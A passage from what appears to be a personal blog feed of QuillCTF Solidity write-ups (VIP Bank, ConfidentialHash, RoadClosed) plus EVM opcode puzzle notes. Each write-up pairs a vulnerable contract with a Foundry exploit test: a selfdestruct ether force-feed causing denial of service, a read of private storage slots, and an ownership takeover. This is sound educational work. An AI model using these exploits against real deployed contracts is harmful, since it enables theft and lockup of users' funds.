require(VIP[msg.sender] == true, &quot;you are not our VIP customer&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addVIP(address addr) public onlyManager &#123;</span><br><span class="line">        VIP[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable onlyVIP &#123;</span><br><span class="line">        require(msg.value &lt;= 0.05 ether, &quot;Cannot deposit more than 0.05 ETH per transaction&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) public onlyVIP &#123;</span><br><span class="line">        require(address(this).balance &lt;= maxETH, &quot;Cannot withdraw more than 0.5 ETH per transaction&quot;);</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount, &quot;Not enough ether&quot;);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        (bool success,) = payable(msg.sender).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Withdraw Failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contractBalance() public view returns (uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Our objective is to DOS the Vip Bank.we can read the check in <code>withdraw()</code> function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(address(this).balance &lt;= maxETH, &quot;Cannot withdraw more than 0.5 ETH per transaction&quot;);</span><br></pre></td></tr></table></figure><p>so i f we make <code>address(this).balance &gt; maxETH</code> , nobody can withdraw anymoney from the contract.</p><p>also we can see the deposit function only can be called by the VIP person. but we can use <code>selfdestruct</code> to transfer the money.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity 0.8.7;import &quot;forge-std/Test.sol&quot;;import &quot;../src/3-VipBank/Bank.sol&quot;;contract Attack &#123;    address public target;    constructor(address _target) &#123;        target = _target;    &#125;    receive() external payable &#123;&#125;    function exp() public &#123;        selfdestruct(payable(target));    &#125;&#125;contract BankTest is Test &#123;    VIP_Bank target;    address admin;    address attacker;    address customer;    function setUp() public &#123;        admin = makeAddr(&quot;admin&quot;);        attacker = makeAddr(&quot;attacker&quot;);        customer = makeAddr(&quot;customer&quot;);        vm.deal(attacker, 10 ether);        vm.deal(customer, 10 ether);        vm.startPrank(admin);        target = new VIP_Bank();        target.addVIP(customer);        vm.stopPrank();    &#125;    function att() public &#123;        vm.startPrank(customer);        target.deposit&#123;value: 0.05 ether&#125;();        vm.stopPrank();        vm.startPrank(attacker);        assertEq(0.05 ether, target.contractBalance());        Attack attack = new Attack(address(target));        payable(attack).transfer(1 ether);        attack.exp();        vm.stopPrank();        assertEq(target.contractBalance(), 1.05 ether);        vm.startPrank(customer);        vm.expectRevert();        target.withdraw(0.05 ether);    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-2.ConfidentialHash</title>
      <link href="/2024/01/22/QuillCTF-2-ConfidentialHash/"/>
      <url>/2024/01/22/QuillCTF-2-ConfidentialHash/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“Private doesn’t mean confidential”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Find the keccak256 hash of aliceHash and bobHash.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract Confidential &#123;</span><br><span class="line">    string public firstUser = &quot;ALICE&quot;;</span><br><span class="line">    uint public alice_age = 24;</span><br><span class="line">bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key</span><br><span class="line">    bytes32 public ALICE_DATA = &quot;QWxpY2UK&quot;;</span><br><span class="line">    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);</span><br><span class="line"></span><br><span class="line">    string public secondUser = &quot;BOB&quot;;</span><br><span class="line">    uint public bob_age = 21;</span><br><span class="line">    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key</span><br><span class="line">    bytes32 public BOB_DATA = &quot;Qm9iCg&quot;;</span><br><span class="line">    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);</span><br><span class="line"></span><br><span class="line">constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(key1, key2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkthehash(bytes32 _hash) public view returns(bool)&#123;</span><br><span class="line">        require (_hash == hash(aliceHash, bobHash));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Read the storage</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">string public firstUser = &quot;ALICE&quot;; //0</span><br><span class="line">    uint256 public alice_age = 24; //1</span><br><span class="line">    bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key//2</span><br><span class="line">    bytes32 public ALICE_DATA = &quot;QWxpY2UK&quot;; //3</span><br><span class="line">    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA); //4</span><br><span class="line"></span><br><span class="line">    string public secondUser = &quot;BOB&quot;; //5</span><br><span class="line">    uint256 public bob_age = 21; //6</span><br><span class="line">    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key//7</span><br><span class="line">    bytes32 public BOB_DATA = &quot;Qm9iCg&quot;; //8</span><br><span class="line">    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA); //9</span><br></pre></td></tr></table></figure><p>or use forge inspect</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % forge inspect Confidential storage           </span><br><span class="line">&#123;</span><br><span class="line">  &quot;storage&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45010,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;firstUser&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_string_storage&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45013,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;alice_age&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_uint256&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45015,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;ALICE_PRIVATE_KEY&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45018,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;ALICE_DATA&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45024,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;aliceHash&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;4&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45027,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;secondUser&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;5&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_string_storage&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45030,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bob_age&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;6&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_uint256&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45032,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;BOB_PRIVATE_KEY&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;7&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45035,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;BOB_DATA&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;8&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45041,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bobHash&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;9&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;types&quot;: &#123;</span><br><span class="line">    &quot;t_bytes32&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;inplace&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bytes32&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;t_string_storage&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;bytes&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;string&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;t_uint256&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;inplace&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;uint256&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><ul><li>Use load Cheatcode</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/2-Hash/Hash.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract testCon is Test, Confidential &#123;</span><br><span class="line">    Confidential challenge;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        challenge = new Confidential();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testConfidential() public &#123;</span><br><span class="line">        bytes32 aliceHash = vm.load(address(challenge), bytes32(uint256(4)));</span><br><span class="line">        bytes32 bobHash = vm.load(address(challenge), bytes32(uint256(9)));</span><br><span class="line">        bytes32 hash_value = challenge.hash(aliceHash, bobHash);</span><br><span class="line"></span><br><span class="line">        bool isOK = challenge.checkthehash(hash_value);</span><br><span class="line">        assert(isOK == true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-1.RoadClosed</title>
      <link href="/2024/01/22/QuillCTF-1-RoadClosed/"/>
      <url>/2024/01/22/QuillCTF-1-RoadClosed/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“We keep out the wrong people – by letting anyone in.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ol><li>Become the owner of the contract</li><li>Change the value of hacked to true</li></ol><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract RoadClosed &#123;</span><br><span class="line"></span><br><span class="line">    bool hacked;</span><br><span class="line">    address owner;</span><br><span class="line">address pwner;</span><br><span class="line">    mapping(address =&gt; bool) whitelistedMinters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function isContract(address addr) public view returns (bool) &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(addr)</span><br><span class="line">            &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns(bool)&#123;</span><br><span class="line">        if (msg.sender==owner) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) public &#123;</span><br><span class="line">        require(!isContract(addr),&quot;Contracts are not allowed&quot;);</span><br><span class="line">        whitelistedMinters[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function changeOwner(address addr) public &#123;</span><br><span class="line">        require(whitelistedMinters[addr], &quot;You are not whitelisted&quot;);</span><br><span class="line">require(msg.sender == addr, &quot;address must be msg.sender&quot;);</span><br><span class="line">        require(addr != address(0), &quot;Zero address&quot;);</span><br><span class="line">        owner = addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn(address addr) external payable&#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;Contracts are not allowed&quot;);</span><br><span class="line">require(msg.sender == addr, &quot;address must be msg.sender&quot;);</span><br><span class="line">        require (msg.sender == owner, &quot;Must be owner&quot;);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() external payable &#123;</span><br><span class="line">        require(msg.sender == pwner);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isHacked() public view returns(bool) &#123;</span><br><span class="line">        return hacked;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Just call function one by one.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;../src/1-RoadClosed/roadclosed.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RoadClosedTest is Test &#123;</span><br><span class="line">    RoadClosed challenge;</span><br><span class="line"></span><br><span class="line">    address public deployer;</span><br><span class="line">    address public pwner;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        challenge = new RoadClosed();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        pwner = makeAddr(&quot;0xdeadbeef&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testOwner() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        assertEq(challenge.isOwner(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testStatus() public &#123;</span><br><span class="line">        vm.startPrank(pwner);</span><br><span class="line">        assertEq(challenge.isHacked(), false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttack() public &#123;</span><br><span class="line">        vm.startPrank(pwner);</span><br><span class="line">        challenge.addToWhitelist(pwner);</span><br><span class="line">        challenge.changeOwner(pwner);</span><br><span class="line">        challenge.pwn(pwner);</span><br><span class="line">        assertEq(challenge.isHacked(), true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About_FlashLoans</title>
      <link href="/2024/01/18/About-FlashLoans/"/>
      <url>/2024/01/18/About-FlashLoans/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-Season1</title>
      <link href="/2024/01/15/QuillCTF-Season1/"/>
      <url>/2024/01/15/QuillCTF-Season1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Road-Closed"><a href="#1-Road-Closed" class="headerlink" title="1-Road-Closed"></a>1-Road-Closed</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Opcode-EVM_PUZZLES</title>
      <link href="/2024/01/08/Opcode-EVM-PUZZLES/"/>
      <url>/2024/01/08/Opcode-EVM-PUZZLES/</url>
      
        <content type="html"><![CDATA[<h2 id="Puzzles1"><a href="#Puzzles1" class="headerlink" title="Puzzles1"></a>Puzzles1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 1 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: (0) </span><br></pre></td></tr></table></figure><blockquote><p>考察JUMP</p></blockquote><p><strong>CALLVALUE</strong></p><ul><li>操作码：<code>0x34</code></li><li>gas消耗: 2</li><li>功能：将发送给合约的ether的数量（以wei为单位）压入堆栈。</li><li>使用场景：当合约需要知道有多少以太币被发送时使用。</li></ul><p><strong>JUMP</strong><br><code>JUMP</code>指令用于无条件跳转到一个新的程序计数器位置。它从堆栈中弹出一个元素（也就是栈顶），将这个元素设定为新的程序计数器（<code>pc</code>）的值。操作码是<code>0x56</code>，gas消耗为8。</p><p><strong>JUMPDEST</strong></p><p><code>JUMPDEST</code>指令标记一个有效的跳转目标位置，不然无法使用<code>JUMP</code>和<code>JUMPI</code>进行跳转。它的操作码是<code>0x5b</code>，<code>gas</code>消耗为1。<br><code>JUMP</code> 和 <code>JUMPI</code> 指令只能跳转到被标记为 <code>JUMPDEST</code> 的位置。这个机制是为了确保代码的安全性，防止通过跳转到随机或不合适的代码位置来执行潜在的恶意操作。</p><p>所以输入<code>8</code>,使<code>CALLVALUE=8</code>，通过挑战</p><h2 id="Puzzles2"><a href="#Puzzles2" class="headerlink" title="Puzzles2"></a>Puzzles2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 2 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br></pre></td></tr></table></figure><p><strong>CODESIZE</strong></p><ul><li>操作码：<code>0x38</code></li><li>gas消耗： 2</li><li>功能：获取当前合约代码的字节长度，然后压入堆栈。</li><li>使用场景：当合约需要访问自己的字节码时使用。</li></ul><p>在这里就是10</p><p><strong>SUB</strong><br>算数指令<code>SUB</code>指令从堆栈顶部弹出两个元素，然后计算第一个元素减去第二个元素，最后将结果推入堆栈。这个指令的操作码是<code>0x03</code>，gas消耗为<code>3</code>。</p><p>所以目标是 <code>CODESIZE - CALLVALUE = 6</code></p><p>所以我们使得 <code>CALLVALUE = 4</code> ，就可以通过挑战</p><h2 id="Puzzles3"><a href="#Puzzles3" class="headerlink" title="Puzzles3"></a>Puzzles3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 3 